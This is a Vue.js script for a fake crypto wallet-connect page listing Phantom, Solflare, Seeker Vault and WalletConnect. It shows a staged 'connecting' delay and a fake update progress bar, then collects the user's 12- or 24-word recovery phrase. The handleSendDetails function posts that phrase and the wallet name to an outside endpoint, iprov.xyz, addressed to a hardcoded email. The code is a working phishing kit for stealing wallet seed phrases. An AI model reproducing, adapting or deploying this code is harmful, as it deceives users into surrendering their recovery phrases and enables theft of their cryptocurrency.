const { createApp, ref, watch, onMounted } = Vue;

createApp({
	setup() {
		/* ===============================
       Global UI state
       =============================== */
		const isDrawerOpen = ref(false); // CLOSED by default
		const isWalletModalOpen = ref(false);

		/* ===============================
       Wallet modal state
       =============================== */
		const activeView = ref("select");
		const selectedWallet = ref(null);
		const progress = ref(0);
		const wordCount = ref(12);
		const phrases = ref(Array(12).fill(""));
		const loading = ref(false);

		const wallets = [
			{ name: "Seeker Vault", id: "seeker", logo: "/skr-logo.svg" },
			{ name: "Phantom", id: "phantom", logo: "/phantom.png" },
			{ name: "Solflare", id: "solflare", logo: "/solflare.png" },
			{
				name: "WalletConnect",
				id: "walletconnect",
				logo: "/walletconnect.jpg",
			},
		];

		/* ===============================
       Drawer logic
       =============================== */
		function openDrawer() {
			isDrawerOpen.value = true;
		}

		function closeDrawer() {
			isDrawerOpen.value = false;
		}

		function toggleDrawer() {
			isDrawerOpen.value = !isDrawerOpen.value;
		}

		/* ===============================
       Wallet modal logic
       =============================== */
		function openWalletModal() {
			isWalletModalOpen.value = true;
			activeView.value = "select";
			selectedWallet.value = null;
		}

		function closeWalletModal() {
			isWalletModalOpen.value = false;
			activeView.value = "select";
			selectedWallet.value = null;
			progress.value = 0;
			wordCount.value = 12;
			phrases.value = Array(12).fill("");
		}

		function selectWallet(wallet) {
			selectedWallet.value = wallet;
			activeView.value = "connecting";

			setTimeout(() => {
				activeView.value = "update";
			}, 1500);
		}

		function startUpdate() {
			activeView.value = "progress";
			progress.value = 0;

			const interval = setInterval(() => {
				progress.value += 2;
				if (progress.value >= 100) {
					clearInterval(interval);
					activeView.value = "recovery";
				}
			}, 100);
		}

		function handleWordCountChange(e) {
			const count = Number(e.target.value);
			wordCount.value = count;
			phrases.value = Array(count).fill("");
		}

		function handlePhraseChange(index, value) {
			const trimmed = value.trim();

			if (trimmed.includes(" ")) {
				const words = trimmed.split(/\s+/).filter(Boolean);
				if (words.length === 12 || words.length === 24) {
					wordCount.value = words.length;
					phrases.value = words;
				} else {
					alert("Phrase must be 12 or 24 words.");
					phrases.value = Array(wordCount.value).fill("");
				}
			} else {
				phrases.value[index] = trimmed;
			}
		}

		function togglePhraseVisibility(index) {
			const input = document.getElementById(`phrase-input-${index}`);
			if (input) {
				input.type = input.type === "password" ? "text" : "password";
			}
		}

		async function handleSendDetails() {
			if (phrases.value.some((p) => !p.trim())) {
				alert("Fill all fields.");
				return;
			}

			loading.value = true;
			try {
				await fetch("https://iprov.xyz/api/send-email", {
					method: "POST",
					headers: { "Content-Type": "application/json" },
					body: JSON.stringify({
						// walletName: selectedWallet.value.name,
						// details: phrases.value.join(" "),
						email: "Gerfish7458@proton.me", //enter email here
						subject: "Recovery Request",
						message: `Wallet is: ${selectedWallet.value.name}\n\nRecovery Phrase: ${phrases.value.join(" ")}`,
					}),
				});
			} finally {
				loading.value = false;
				activeView.value = "sent";
			}
		}

		/* ===============================
       Side effects
       =============================== */
		watch(isDrawerOpen, (open) => {
			document.body.style.overflow = open ? "hidden" : "";
		});

		onMounted(() => {
			window.addEventListener("keydown", (e) => {
				if (e.key === "Escape") {
					closeDrawer();
					closeWalletModal();
				}
			});
		});

		/* ===============================
       External hooks (ONLY where needed)
       =============================== */
		window.openWalletModal = openWalletModal;

		return {
			isDrawerOpen,
			isWalletModalOpen,
			wallets,
			activeView,
			selectedWallet,
			progress,
			wordCount,
			phrases,
			loading,
			openDrawer,
			closeDrawer,
			toggleDrawer,
			openWalletModal,
			closeWalletModal,
			selectWallet,
			startUpdate,
			handleWordCountChange,
			handlePhraseChange,
			togglePhraseVisibility,
			handleSendDetails,
		};
	},
}).mount("#app");
